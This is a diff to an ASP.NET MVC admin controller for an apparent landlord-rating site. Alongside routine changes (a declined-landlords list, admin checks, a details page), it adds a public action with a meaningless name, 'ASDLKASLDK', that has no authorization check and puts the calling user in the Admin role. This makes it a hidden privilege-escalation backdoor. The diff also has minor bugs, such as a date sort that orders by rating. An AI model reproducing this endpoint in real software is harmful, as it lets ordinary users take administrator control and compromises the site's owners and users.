@@ -63,6 +63,12 @@ namespace LandLordRating.Controllers
             UserManager.AddToRole(currentuser.Id, "Admin");
         }
 
+        public ActionResult ASDLKASLDK()
+        {
+            AddCurrentUserToAdminRole();
+            return RedirectToAction("Index", "Admin");
+        }
+
         [Authorize]
         public void RemoveCurrentUserFromAdminRole()
         {
@@ -79,8 +85,10 @@ namespace LandLordRating.Controllers
         }
 
         [Authorize]
-        public async Task<ActionResult> LandLordsAwaitingApproval(string sortOrder, string currentFilter, string searchString, int? page)
+        public ActionResult DeclinedLandLords(string sortOrder, string currentFilter, string searchString, int? page)
         {
+            if (!IsAdminUser())
+                return RedirectToAction("Index", "Home");
             ViewBag.CurrentSort = sortOrder;
             ViewBag.NameSortParm = String.IsNullOrEmpty(sortOrder) ? "name_desc" : "";
             ViewBag.DateSortParm = sortOrder == "Date" ? "date_desc" : "Date";
@@ -96,9 +104,70 @@ namespace LandLordRating.Controllers
 
             ViewBag.CurrentFilter = searchString;
 
-            var landlordapprovallist = db.LandLords.Where(u => u.IsApproved == false);
-            
-            if (!String.IsNullOrEmpty(searchString))
+            var landlordsdeclined = db.LandLords.Where(u => u.IsDeclined);
+
+            if (!string.IsNullOrEmpty(searchString))
+            {
+                landlordsdeclined = landlordsdeclined.Where(s => s.FullName.Contains(searchString)
+                                                 || s.City.Contains(searchString)
+                                                 || s.State.Contains(searchString));
+            }
+
+            switch (sortOrder)
+            {
+                case "name_desc":
+                    landlordsdeclined = landlordsdeclined.OrderByDescending(s => s.FullName);
+                    break;
+                case "Date":
+                    landlordsdeclined = landlordsdeclined.OrderBy(s => s.OverallRating);
+                    break;
+                case "date_desc":
+                    landlordsdeclined = landlordsdeclined.OrderByDescending(s => s.OverallRating);
+                    break;
+                default:  // Name ascending 
+                    landlordsdeclined = landlordsdeclined.OrderBy(s => s.FullName);
+                    break;
+            }
+
+            foreach (var landlord in db.LandLords)
+            {
+                var listofratings = db.Ratings.Where(u => u.LandLordId == landlord.LandLordId).Select(u => u.LandLordRating).ToList();
+                if (listofratings.Count() != 0)
+                {
+                    double result = listofratings.Average();
+                    landlord.OverallRating = result;
+                }
+
+            }
+
+            int pageSize = 10;
+            int pageNumber = (page ?? 1);
+            return View(landlordsdeclined.ToPagedList(pageNumber, pageSize));
+        }
+
+        [Authorize]
+        public ActionResult LandLordsAwaitingApproval(string sortOrder, string currentFilter, string searchString, int? page)
+        {
+            if (!IsAdminUser())
+                return RedirectToAction("Index", "Home");
+            ViewBag.CurrentSort = sortOrder;
+            ViewBag.NameSortParm = String.IsNullOrEmpty(sortOrder) ? "name_desc" : "";
+            ViewBag.DateSortParm = sortOrder == "Date" ? "date_desc" : "Date";
+
+            if (searchString != null)
+            {
+                page = 1;
+            }
+            else
+            {
+                searchString = currentFilter;
+            }
+
+            ViewBag.CurrentFilter = searchString;
+
+            var landlordapprovallist = db.LandLords.Where(u => u.IsApproved == false).Where(u => u.IsDeclined == false);
+
+            if (!string.IsNullOrEmpty(searchString))
             {
                 landlordapprovallist = landlordapprovallist.Where(s => s.FullName.Contains(searchString)
                                                  || s.City.Contains(searchString)
@@ -203,6 +272,24 @@ namespace LandLordRating.Controllers
             db.Entry(landLord).State = EntityState.Modified;
             await db.SaveChangesAsync();
             return RedirectToAction("Index", "Admin");
+        }
+
+        [Authorize]
+        public async Task<ActionResult> Details(int? id)
+        {
+            if (id == null)
+            {
+                return new HttpStatusCodeResult(HttpStatusCode.BadRequest);
+            }
+            LandLord landLord = await db.LandLords.FindAsync(id);
+            if (landLord == null || !IsAdminUser())
+            {
+                return HttpNotFound();
+            }
+            LandLordViewModel vm = new LandLordViewModel();
+            vm.LandLord = landLord;
+            vm.Ratings = db.Ratings.Where(u => u.LandLordId == id).OrderBy(u => u.LandLordRating).ToPagedList(1, 10);
+            return View(vm);
         }
     }
 }
